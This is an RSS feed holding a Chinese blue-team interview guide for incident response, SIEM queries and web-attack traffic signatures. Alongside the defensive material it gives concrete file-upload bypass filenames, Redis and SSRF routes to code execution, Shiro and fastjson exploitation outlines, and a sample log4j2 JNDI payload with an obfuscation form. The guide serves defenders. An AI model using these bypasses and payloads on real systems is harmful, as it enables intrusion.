<?xml-stylesheet href="/rss.xsl" type="text/xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>write-up</title>
    <link>https://xxxhidexxx.github.io/</link>
    <description>Recent content on write-up</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>null</copyright>
    <lastBuildDate>Sat, 18 May 2024 00:00:00 +0000</lastBuildDate>
    
        <atom:link href="https://xxxhidexxx.github.io/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>蓝队进阶攻略</title>
        <link>https://xxxhidexxx.github.io/posts/sec/hvv/</link>
        <pubDate>Sat, 18 May 2024 00:00:00 +0000</pubDate>
        
        <guid>https://xxxhidexxx.github.io/posts/sec/hvv/</guid>
        <description>write-up https://xxxhidexxx.github.io/posts/sec/hvv/ -&lt;h2 id=&#34;应急类问题&#34;&gt;应急类问题&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;应急问题的回答公式&#34;&gt;应急问题的回答公式&lt;/h3&gt;
&lt;p&gt;先隔离出现问题的主机；判断影响范围；找到漏洞源头；清除攻击载荷；安全加固，修复漏洞；溯源分析；输出报告。&lt;/p&gt;
&lt;p&gt;根据具体情况选择性填充细节。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;你到客户现场进行安全加固都要做哪些事&#34;&gt;你到客户现场进行安全加固都要做哪些事&lt;/h3&gt;
&lt;p&gt;检查弱口令和未授权访问；确定开启了日志的审计功能；检查防火墙策略，关闭不必要的端口；停止不必要的服务，修改不必要的权限；检查系统补丁；更新中间件版本。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;怎么判断设备告警是不是误报&#34;&gt;怎么判断设备告警是不是误报&lt;/h3&gt;
&lt;p&gt;看 ip 是否来自内网，是否为正常业务。记录正常业务的特征，方便后续判断，避免封禁 ip 影响业务。&lt;/p&gt;
&lt;p&gt;看流量特征是否为恶意，根据具体的 payload 判断是否攻击成功。例如攻击者扫描返回 400，或者使用的 poc 是我们没有用到的组件，那么这些告警没有产生危害，封 ip 进行预防即可。&lt;/p&gt;
&lt;p&gt;在封 ip 之前可以看一下这个 ip 的访问历史都是什么内容，可以在天眼中使用 sip eq x.x.x.x 进行过滤。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;攻击者在外网但是设备出现内网告警怎么解释这种现象怎么看到真实-ip&#34;&gt;攻击者在外网，但是设备出现内网告警，怎么解释这种现象，怎么看到真实 ip&lt;/h3&gt;
&lt;p&gt;可能是安全设备误报，在安全设备采集数据的时候把一些 ip 转换成了内网 ip 导致告警显示的是内网，出现这种误报可能是安全设备在网络拓扑中的位置错了；可能是 ip 欺骗，例如 xff 请求头伪造；可能有 ssrf 漏洞可以访问内网；可能有失陷主机正在进行横向移动。&lt;/p&gt;
&lt;p&gt;需要根据告警内容排查是否为误报。&lt;/p&gt;
&lt;p&gt;可以通过 x-forwarded-for 看真实 ip，其中 xff 的几项分别为：真实 ip，代理 ip-1，代理 ip-2，&amp;hellip;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;已知内网告警为真实威胁你会怎么做&#34;&gt;已知内网告警为真实威胁，你会怎么做&lt;/h3&gt;
&lt;p&gt;先判断是否为蜜罐。&lt;/p&gt;
&lt;p&gt;根据告警信息定位出现问题的设备，路由器 arp 缓存表可以找内网 ip 对应的 mac 地址。&lt;/p&gt;
&lt;p&gt;对告警的主机进行隔离，对影响范围内的主机进行排查。&lt;/p&gt;
&lt;p&gt;清除攻击载荷。&lt;/p&gt;
&lt;p&gt;根据日志进行分析和溯源，调查攻击方法，建立攻击者画像。&lt;/p&gt;
&lt;p&gt;协助恢复业务，输出报告。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;已知内网横向移动怎么办&#34;&gt;已知内网横向移动，怎么办&lt;/h3&gt;
&lt;p&gt;隔离失陷主机，备份环境，判断横向移动的影响范围。&lt;/p&gt;
&lt;p&gt;判断攻击方式，查找漏洞源头，评估攻击者的目的。&lt;/p&gt;
&lt;p&gt;清除后门，修复漏洞，安全加固。&lt;/p&gt;
&lt;p&gt;查看蜜罐等安全设备和日志文件，进行溯源。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;紧急通知-windows-系统有人点击钓鱼文件了你负责排查远程桌面应该怎么做&#34;&gt;紧急通知 windows 系统有人点击钓鱼文件了，你负责排查远程桌面，应该怎么做&lt;/h3&gt;
&lt;p&gt;打开注册表禁用远程桌面。&lt;/p&gt;
&lt;p&gt;在注册表里面找远程桌面连接的历史记录。&lt;/p&gt;
&lt;p&gt;找 3389 端口的外联流量。&lt;/p&gt;
&lt;p&gt;如果有远程桌面连接应立刻通报研判组和客户，进行溯源。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;ddos-的加固和处置&#34;&gt;ddos 的加固和处置&lt;/h3&gt;
&lt;p&gt;加固：部署负载均衡、多节点、cdn、集群；部署抗 ddos 设备、流量监控设备；关闭非必要端口。&lt;/p&gt;
&lt;p&gt;处置：判断 ddos 的类型（网络层、传输层、应用层）；封禁异常访问的 ip；保留攻击期间的 ip 进行取证；调整安全设备的防护策略；联系运营商清洗流量。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;发现网页篡改你会怎么做&#34;&gt;发现网页篡改，你会怎么做&lt;/h3&gt;
&lt;p&gt;隔离被感染主机。&lt;/p&gt;
&lt;p&gt;排查业务系统，判断影响范围。&lt;/p&gt;
&lt;p&gt;确定漏洞源头。&lt;/p&gt;
&lt;p&gt;修复漏洞，加固系统。&lt;/p&gt;
&lt;p&gt;查找数据备份，恢复业务。&lt;/p&gt;
&lt;p&gt;查询日志和设备告警记录进行溯源反制，建立攻击者画像。&lt;/p&gt;
&lt;p&gt;输出报告。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;已知-webshell-上传你应该怎么做&#34;&gt;已知 webshell 上传，你应该怎么做&lt;/h3&gt;
&lt;p&gt;首先对失陷的主机进行隔离，看情况可以断网。&lt;/p&gt;
&lt;p&gt;然后确定 webshell 的位置和创建时间，可以用 D 盾、河马等工具，也可以自己查看日志文件。&lt;/p&gt;
&lt;p&gt;清除 webshell 之后排查是否留有后门。&lt;/p&gt;
&lt;p&gt;通过日志查看是否进行了危险操作。查看是否有新增用户。查看可疑的进程、服务、网络连接。&lt;/p&gt;
&lt;p&gt;排查后门之后报告漏洞点，提供加固修复的建议。&lt;/p&gt;
&lt;p&gt;通过日志进行溯源，建立攻击者画像。&lt;/p&gt;
&lt;p&gt;整理工作，输出一份报告。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;已知-dns-告警一定是感染吗可能的原因是什么&#34;&gt;已知 DNS 告警，一定是感染吗，可能的原因是什么&lt;/h3&gt;
&lt;p&gt;可能是感染，也可能是历史情报相似的可疑访问。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;发现已经中了勒索病毒怎么办&#34;&gt;发现已经中了勒索病毒，怎么办&lt;/h3&gt;
&lt;p&gt;隔离感染的主机，判断影响范围。&lt;/p&gt;
&lt;p&gt;判断勒索病毒的种类，可以在病毒库中进行搜索，查找解密工具。&lt;/p&gt;
&lt;p&gt;找到漏洞源头，进行修复和系统加固。&lt;/p&gt;
&lt;p&gt;查看日志和设备告警记录进行溯源，建立攻击者画像。&lt;/p&gt;
&lt;p&gt;协助恢复数据和业务，输出报告。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;发现已经中了挖矿木马怎么办&#34;&gt;发现已经中了挖矿木马，怎么办&lt;/h3&gt;
&lt;p&gt;隔离被感染的主机，判断影响范围。&lt;/p&gt;
&lt;p&gt;找到挖矿进程并终止。如果隐藏了进程可以使用一些工具进行排查，例如 linux 的 unhide。&lt;/p&gt;
&lt;p&gt;清除可疑的定时任务和非必要服务。&lt;/p&gt;
&lt;p&gt;根据系统日志文件排查后门，清除木马和后门。&lt;/p&gt;
&lt;p&gt;找到漏洞源头，进行修复和加固。&lt;/p&gt;
&lt;p&gt;协助恢复业务，输出报告。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;设备类问题&#34;&gt;设备类问题&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;天眼每个字段的含义&#34;&gt;天眼每个字段的含义&lt;/h3&gt;
&lt;p&gt;sip 源 ip，dip 为目的 ip，sport 为源端口，dport 为目的端口。&lt;/p&gt;
&lt;p&gt;attack sip 表示攻击者的 ip。&lt;/p&gt;
&lt;p&gt;dns type 字段，0 表示 dns 请求，1 表示 dns 响应，addr 表示该 host 对应的 ip 地址，可能有多个记录。&lt;/p&gt;
&lt;p&gt;proto 字段表示协议。&lt;/p&gt;
&lt;p&gt;from 字段表示发件人。&lt;/p&gt;
&lt;p&gt;GEO 字段表示 ip 的物理位置。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;天眼告警的结果除了成功还有哪些怎么判断&#34;&gt;天眼告警的结果除了成功还有哪些，怎么判断&lt;/h3&gt;
&lt;p&gt;成功，失败，尝试，未知。未知一般是告警误报。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;天眼内网横向的告警类型&#34;&gt;天眼内网横向的告警类型&lt;/h3&gt;
&lt;p&gt;基于 cs 的告警，隧道类的告警，内网段进行漏洞扫描的告警，源于内网的暴力破解的告警。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;怎么通过天眼判断资产是否失陷&#34;&gt;怎么通过天眼判断资产是否失陷&lt;/h3&gt;
&lt;p&gt;不断外联恶意地址，有 webshell 连接的告警或者隧道类的告警，就可以判断为资产已经失陷。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;发现天眼中受害-ip-为源-ip怎么解释&#34;&gt;发现天眼中受害 ip 为源 ip，怎么解释&lt;/h3&gt;
&lt;p&gt;可能是安全设备配置错误导致的误报；可能是 ip 欺骗，xff 请求头伪造；也可能是 ssrf 或者内网横向。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;天眼分析平台中-ioc-表示什么含义反映了什么&#34;&gt;天眼分析平台中 IOC 表示什么含义，反映了什么&lt;/h3&gt;
&lt;p&gt;IOC 表示匹配成功的威胁情报。&lt;/p&gt;
&lt;p&gt;IOC 反映了主机的失陷特征信息，包括：入侵工具、恶意软件和攻击者画像。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;天眼分析平台的运算符有哪些&#34;&gt;天眼分析平台的运算符有哪些&lt;/h3&gt;
&lt;p&gt;AND，OR，NOT。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;给定一个天眼日志要求搜索-80-和-443-端口的记录怎么做&#34;&gt;给定一个天眼日志，要求搜索 80 和 443 端口的记录，怎么做&lt;/h3&gt;
&lt;p&gt;语法 sport eq 80 OR sport eq 443 OR dport eq 80 OR dport eq 443。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;给定一个天眼日志要求搜索源-ip-为-a-并且目的-ip-为-b-的日志怎么做&#34;&gt;给定一个天眼日志，要求搜索源 ip 为 A 并且目的 ip 为 B 的日志，怎么做&lt;/h3&gt;
&lt;p&gt;语法 sip(A) AND dip(B)，其中 AND 要大写。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;天眼模糊搜索怎么写查询语句&#34;&gt;天眼模糊搜索怎么写查询语句&lt;/h3&gt;
&lt;p&gt;搜索关键词，用 * 号加部分名称进行模糊搜索。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;天眼告警主机外联流量怎么排查&#34;&gt;天眼告警主机外联流量，怎么排查&lt;/h3&gt;
&lt;p&gt;要判断外联的地址是否为恶意网址或者 dnslog 平台。&lt;/p&gt;
&lt;p&gt;通过威胁情报平台判断外链地址是否是恶意或者是 dnslog 平台。&lt;/p&gt;
&lt;p&gt;如果判断为恶意或 dnslog 并且连接次数较多，可判断主机异常。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;天眼告警显示成功利用怎么处理&#34;&gt;天眼告警显示成功利用，怎么处理&lt;/h3&gt;
&lt;p&gt;根据告警类型分析回显，初步判断是否为误报。如果数据包无法判断，则尝试复现攻击。&lt;/p&gt;
&lt;p&gt;在确认成功利用之后，立刻通报研判组和客户，进行应急。&lt;/p&gt;
&lt;p&gt;如果确认是误报，则使用分析平台查看攻击 ip 的其他攻击行为和攻击结果，将发现时间和攻击行为反馈给客户。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;用过-edr-设备吗&#34;&gt;用过 edr 设备吗&lt;/h3&gt;
&lt;p&gt;edr 就是终端安全响应，在之前实习的单位用过深信服的 edr，主要是做基线安全加固。深信服 edr 打补丁不需要重启服务，印象比较深刻。&lt;/p&gt;
&lt;p&gt;深信服 edr 的基线合规检查项举例：密码策略、账户检测、安全审计策略、登录检测、防火墙、自动更新、非必要服务、防暴力破解、永恒之蓝检测、防恶意代码。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;常用的-wireshark-过滤语法有哪些&#34;&gt;常用的 wireshark 过滤语法有哪些&lt;/h3&gt;
&lt;p&gt;搜索 ip 为 127.0.0.1 的流量可以用 ip.src eq 127.0.0.1 or ip.dst eq 127.0.0.1 或者 ip.addr eq 127.0.0.1。&lt;/p&gt;
&lt;p&gt;搜索端口为 80 的流量可以用 tcp.port eq 80 or udp.port eq 80。&lt;/p&gt;
&lt;p&gt;搜索 tcp 协议并忽略 udp 协议可以用 tcp and !udp。&lt;/p&gt;
&lt;p&gt;搜索 uri 中含有 .mp3 的请求可以用 http.request.uri contains “.mp3”&lt;/p&gt;
&lt;p&gt;搜索 post 请求可以用 http.request.method == “POST”。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;常识类问题&#34;&gt;常识类问题&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;文件上传有哪些限制怎么绕过&#34;&gt;文件上传有哪些限制，怎么绕过&lt;/h3&gt;
&lt;p&gt;黑名单：限制 php 后缀，用大小写 PhP 或者 php5，phtml 进行绕过。&lt;/p&gt;
&lt;p&gt;白名单：只允许特定后缀通过，可以使用 00 截断。&lt;/p&gt;
&lt;p&gt;mime 校验：限制了 content-type。&lt;/p&gt;
&lt;p&gt;文件头信息：每种类型的文件都有特定的文件头，也就是通过前几个 bit 验证文件类型。&lt;/p&gt;
&lt;p&gt;绕过技巧：（1）后缀名用空格或者置空，例如“1.php ”，“1.php. ”，“1.php.”；（2）参数污染，filename=aaaaaaaaaaa1.php，filename===1.php，filename =1.php；（3）回车换行 shell.php.换行jpg；（4）双写，Content-Disposition: form-data; name=&amp;ldquo;file&amp;rdquo;; filename=shell.jpg;filename=shell.jspx; Content-Disposition: form-data; name=&amp;ldquo;file&amp;rdquo;; filename=shell.jpg;filename=shell.jspx.jpg。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;redis-未授权访问在什么条件下能做到-rce怎么加固&#34;&gt;redis 未授权访问在什么条件下能做到 rce，怎么加固&lt;/h3&gt;
&lt;p&gt;redis 未授权访问的条件：（1）redis 默认的 6379 端口可以在公网访问；（2）redis 密码使用弱口令。&lt;/p&gt;
&lt;p&gt;后续 rce 利用及其条件：方法 1，写 ssh，需要服务器有 .ssh 目录并且 redis 有写入权限。方法 2，写 webshell，需要知道 web 的绝对路径。方法 3，主从复制，需要 redis 版本大于等于 4.x，无其他条件。&lt;/p&gt;
&lt;p&gt;加固：防火墙限制外网访问 6379 端口，redis 设置强密码。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;ssrf-用-redis-提升为-rce&#34;&gt;ssrf 用 redis 提升为 rce&lt;/h3&gt;
&lt;p&gt;场景：redis 端口无法在外网访问，用 ssrf 进内网访问 redis 写 shell。&lt;/p&gt;
&lt;p&gt;用 dict 协议探测，用 gopher 协议写入。直接写 webshell 还是需要知道 web 的绝对路径，例如 /var/www/html。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;怎么看-webshell-的命令执行历史&#34;&gt;怎么看 webshell 的命令执行历史&lt;/h3&gt;
&lt;p&gt;windows 打开事件查看器，在应用程序选项里面找到 Microsoft-Windows-CommandProcessor/Operational，可以查看操作历史。&lt;/p&gt;
&lt;p&gt;linux 的操作历史保存在 .bash_history 里面，可以用命令 cat ~/.bash_history | grep “whoami” 进行查看。&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;java-类问题&#34;&gt;java 类问题&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;java-内存马的原理&#34;&gt;java 内存马的原理&lt;/h3&gt;
&lt;p&gt;客户端向 java web 服务器发起的请求会依次经过 listener，filter，servlet 三个组件。&lt;/p&gt;
&lt;p&gt;java 内存马的原理就是利用类加载或 Agent 机制在 JavaEE、框架或中间件的 API 中动态注册一个可访问的后门。&lt;/p&gt;
&lt;p&gt;java 内存马分为两类：servlet-api 型内存马，动态注册 web 组件；字节码增强型内存马，通过 instrumentation 动态修改已有代码。&lt;/p&gt;
&lt;p&gt;动态注册是指通过 rce 注册新的 listener，filter，servlet 组件，或者特殊框架的特殊组件，例如 spring 的 controller 内存马，tomcat 的 valve 内存马。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;java-web-中-servletfilterlistener-的区别&#34;&gt;java web 中 servlet/filter/listener 的区别&lt;/h3&gt;
&lt;p&gt;servlet 是处理请求的动态资源；filter 是过滤器，可以修改请求和响应；listener 是监听器，可以监听并加载一些插件。&lt;/p&gt;
&lt;p&gt;servlet: 冰蝎内存马&lt;/p&gt;
&lt;p&gt;filter: struts2&lt;/p&gt;
&lt;p&gt;listener: spring, log4j&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;怎样排查内存马&#34;&gt;怎样排查内存马&lt;/h3&gt;
&lt;p&gt;（1）heapdump 内存排查。用 heapdump 和 grep 命令进行查找。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;heapdump

strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep &amp;quot;POST /&amp;quot;

strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep -E &amp;quot;/webapps/.*?\!&amp;quot; | sort -u
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（2）如果是 jsp 注入，在日志文件中排查 jsp 的访问请求，通过特征查找内存马&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;find / -name *.jsp | xargs grep &amp;quot;pass&amp;quot; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（3）如果是 rce，查看中间件的 error.log，判断攻击时间和手法；&lt;/p&gt;
&lt;p&gt;（4）根据告警的 url 查找日志，大量相同路径不同参数的请求，页面不存在但是返回 200 则可能有内存马。&lt;/p&gt;
&lt;p&gt;（5）特殊的 classloader 加载（例如 Templateslmpl 和 bcel），对应的 classloader 路径下没有 class 文件。&lt;/p&gt;
&lt;p&gt;（6）结合冰蝎和哥斯拉的 webshell 流量特征进行判断。&lt;/p&gt;
&lt;p&gt;（7）利用检测工具（arthas/牧云，java instrument 技术），检测 filter 类型，agent 类型。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;怎样清除内存马&#34;&gt;怎样清除内存马&lt;/h4&gt;
&lt;p&gt;删除 filter 中的恶意代码。&lt;/p&gt;
&lt;p&gt;中间件注销 filter。&lt;/p&gt;
&lt;p&gt;使用工具 arthas，VisualVM&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;内存马无文件落地怎么取证&#34;&gt;内存马无文件落地，怎么取证&lt;/h4&gt;
&lt;p&gt;/var/log/ 日志取证，结合流量特征用 grep 命令按照正则表达式搜索；/var/cache 缓存取证，结合流量特征用 grep 命令按照正则表达式搜索；检测工具，例如 arthas。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;java-反序列化漏洞概述&#34;&gt;java 反序列化漏洞概述&lt;/h3&gt;
&lt;p&gt;字节流变为 java 对象称为反序列化，反之称为序列化。由于 java 反序列化方法的不慎调用，用户在 http 报文输入的字节流能够被后端当作 java 对象解析。因此攻击者可以利用这个漏洞构造恶意语句交给后端执行。主要危害是 rce 和 dos，现实中一般需要多个漏洞配合利用才能造成实际危害，称为反序列化利用链。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;java-反序列化利用工具&#34;&gt;java 反序列化利用工具&lt;/h4&gt;
&lt;p&gt;ysoserial 集成了很多利用链，只需要查看网站的第三方组件，然后在 ysoserial 里面找对应的利用链。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;jndi-注入是什么&#34;&gt;jndi 注入是什么&lt;/h3&gt;
&lt;p&gt;jndi 是 java 接口，可以访问命名和目录服务。jndi 的 lookup 方法的 uri 参数可控，攻击者注入一个恶意 url，存储一个 java payload，这个 url 被加载时 payload 被解析，造成了注入攻击。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;rmi-是什么&#34;&gt;rmi 是什么&lt;/h3&gt;
&lt;p&gt;rmi 即远程方法调用，分为三个部分：客户端进行方法的调用，服务端提供方法、对代码进行解析，注册中心相当于一个字典，客户端调用服务端的方法时在注册中心进行查询和引用。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;shiro-的流量特征550-和-721-有什么区别&#34;&gt;shiro 的流量特征，550 和 721 有什么区别&lt;/h3&gt;
&lt;p&gt;这里 550 和 721 是 apache 官方 issue 的编号，550 影响版本 version &amp;lt;= 1.2.4，而 721 影响版本 1.2.4 &amp;lt; version &amp;lt; 1.4.2。&lt;/p&gt;
&lt;p&gt;流量特征：shiro 的 cookie 会有一个 rememberme 的值，并且这个值是很长的一个字符串，采用 base64 编码。&lt;/p&gt;
&lt;p&gt;shiro550 使用 aes+base64 加密，密钥写死在代码里面。知道了密钥可以碰撞解密，写 payload 再加密，替换原来的 rememberme 字段，这个 rememberme 最终被反序列化，payload 被后端解析。&lt;/p&gt;
&lt;p&gt;shiro721 不需要知道 key，但是需要一个合法登录用户的 cookie 进行 padding oracle 填充攻击。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;shiro-利用链&#34;&gt;shiro 利用链&lt;/h3&gt;
&lt;p&gt;无依赖利用链，具体情况可以使用工具 ysoserial。&lt;/p&gt;
&lt;p&gt;因为我们知道 Shiro 原生类中是不存在 Commons-Collection 依赖的，所以当没有 CC 依赖的时候我们就无法通过 CC 链进行攻击，我们就需要另外找一个无依赖的方式对 Shiro 的反序列化漏洞进行利用：例如通过 Shiro 自带的依赖 Commons-Beanutils 进行攻击。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;log4j2-的原理怎么判断是否利用成功&#34;&gt;log4j2 的原理，怎么判断是否利用成功&lt;/h3&gt;
&lt;p&gt;log4j2 是日志组件，其 lookups 机制存在 jndi 注入。&lt;/p&gt;
&lt;p&gt;判断利用是否成功：（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；（2）查看目标主机是否存在 dnslog 活动；（3）查看是否下载恶意类。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;log4j2-的流量特征&#34;&gt;log4j2 的流量特征&lt;/h3&gt;
&lt;p&gt;log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}&lt;/p&gt;
&lt;p&gt;log4j2 使用 jndi 注入，找恶意 url。&lt;/p&gt;
&lt;p&gt;log4j2 流量可以看到 rmi 或者 ldap 字样。&lt;/p&gt;
&lt;p&gt;log4j2 流量会出现 dns/ip 相关特征。&lt;/p&gt;
&lt;p&gt;log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}&lt;/p&gt;
&lt;p&gt;log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;已知攻击者正在利用-log4j2-漏洞怎么应急&#34;&gt;已知攻击者正在利用 log4j2 漏洞，怎么应急&lt;/h3&gt;
&lt;p&gt;隔离被攻击的主机，判断影响范围。&lt;/p&gt;
&lt;p&gt;根据 log4j2 特征 ${jndi} 在日志中进行搜索，找到漏洞点和攻击者信息，封禁攻击者 ip。&lt;/p&gt;
&lt;p&gt;在防火墙的出站策略中阻断对常见 dnslog 平台的访问。&lt;/p&gt;
&lt;p&gt;排查内存马并清除。&lt;/p&gt;
&lt;p&gt;通知客户升级组件，进行安全加固。&lt;/p&gt;
&lt;p&gt;对攻击者进行溯源，协助恢复业务，输出报告。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;struts2-反序列化原理&#34;&gt;struts2 反序列化原理&lt;/h3&gt;
&lt;p&gt;Struts2 对标签属性执行 ognl（对象图形导航语言）解析，可造成 rce。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;struts2-的流量特征&#34;&gt;struts2 的流量特征&lt;/h3&gt;
&lt;p&gt;struts 2 的特征是 %{}（或是其 url 编码 %25%7B&amp;hellip;%7D），并且请求体和响应体都包含 payload。&lt;/p&gt;
&lt;p&gt;struts2 文件类型基本上是 .action 和 .jsp 文件。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;weblogic-的流量特征&#34;&gt;weblogic 的流量特征&lt;/h3&gt;
&lt;p&gt;无强特征，请求体和响应体看到大段 java 代码则预判为攻击流量。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;weblogic-历史漏洞&#34;&gt;weblogic 历史漏洞&lt;/h3&gt;
&lt;p&gt;（1）t3 协议引起的反序列化漏洞；（2）Gadget 造成的 rce；（3）任意文件上传；（4）ssrf。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;fastjson-反序列化的原理&#34;&gt;fastjson 反序列化的原理&lt;/h3&gt;
&lt;p&gt;fastjson 在解析 json 数据时存在自动类型转换功能（autoType），fastjson 就会自动解析 @type 参数字段，利用该功能构造恶意 json 数据，使其在反序列化过程中触发漏洞利用链，从而实现恶意代码的执行。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;fastjson-的流量特征&#34;&gt;fastjson 的流量特征&lt;/h3&gt;
&lt;p&gt;fastjson 的强特征是 json 数据以 @type 开头。&lt;/p&gt;
&lt;p&gt;fastjson 用 json 传参，恶意流量的 json 参数含有 java 代码。&lt;/p&gt;
&lt;p&gt;fastjson 流量会看到 rmi 或者 ldap 字样。&lt;/p&gt;
&lt;p&gt;fastjson 的利用链 cc3、cc5 等，fastjson 有很多高危类。&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&#34;fastjson-rce-流程&#34;&gt;fastjson rce 流程&lt;/h4&gt;
&lt;p&gt;fastjson 将 java 对象序列化为 json 字节流，将 json 字节流反序列化为 java 对象。fastjson 使用 rmi 或者 ldap 协议（远程方法调用、情形目录访问）。&lt;/p&gt;
&lt;p&gt;简单描述一下 fastjson rce 的流程。攻击者的 payload 被受害者的服务器反序列化解析后，通过 jndi 连接攻击者指定的 rmi 服务器。攻击者 rmi 服务器向受害者服务器返回一个对象。受害者服务器检测到本地不存在该对象，向攻击者提供的地址请求恶意 class 文件。受害者服务器收到 class 文件后加载进内存，实例化的时候执行构造函数，完成 rce。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;fastjson-不出网怎么利用&#34;&gt;fastjson 不出网怎么利用&lt;/h3&gt;
&lt;p&gt;TemplatesImpl 利用链：利用条件比较苛刻，需要 parse() 和 parseObject() 满足特殊格式，一些数据的属性要满足 private 属性。&lt;/p&gt;
&lt;p&gt;becl 攻击：利用 tomcat 的 BasicDataSource 链编译 poc，将 poc 的 class 字节码转化为 bcel 然后发送 payload。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;log4j2-和-fastjson-联动&#34;&gt;log4j2 和 fastjson 联动&lt;/h3&gt;
&lt;hr&gt;
&lt;h2 id=&#34;红蓝对抗问题&#34;&gt;红蓝对抗问题&lt;/h2&gt;
&lt;hr&gt;
&lt;h3 id=&#34;cobaltstrike-的流量特征&#34;&gt;CobaltStrike 的流量特征&lt;/h3&gt;
&lt;p&gt;每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。&lt;/p&gt;
&lt;p&gt;大小约等于 211kb 的文件下载，并且下载路径有 checksum8 的特征。&lt;/p&gt;
&lt;p&gt;post 请求 url 含有 /submit.php?id=，这是 cs 在回传数据。&lt;/p&gt;
&lt;p&gt;形如 0.0.0.241 之类的奇怪 ip，说明已经到了 stageless 阶段。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;metasploitframework-的流量特征&#34;&gt;MetasploitFramework 的流量特征&lt;/h3&gt;
&lt;p&gt;msf 默认使用 4444 端口作为反向连接端口。&lt;/p&gt;
&lt;p&gt;流量有特殊字符：MZ 标头，cannot be run in DOS mode 字样，&amp;ldquo;meterpreter&amp;rdquo;、&amp;ldquo;revshell&amp;rdquo; 等字样。&lt;/p&gt;
&lt;p&gt;心跳包、固定 ua 头。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;冰蝎的流量特征&#34;&gt;冰蝎的流量特征&lt;/h3&gt;
&lt;p&gt;冰蝎 behinder 是 webshell 管理工具，和 java 反序列化结合比较多，没有特别明显的强特征。和其他 webshell 管理工具相比，冰蝎的特点是动态加密。&lt;/p&gt;
&lt;p&gt;冰蝎 2.0-4.0 弱特征：同一个 ip 短时间频繁更换 user-agent。&lt;/p&gt;
&lt;p&gt;冰蝎 2.0-4.0 使用 16 位 md5 作为 aes 密钥。冰蝎 webshell 的默认密钥是 e45e329feb5d925b，即 rebeyond 的 md5 前 16 位。&lt;/p&gt;
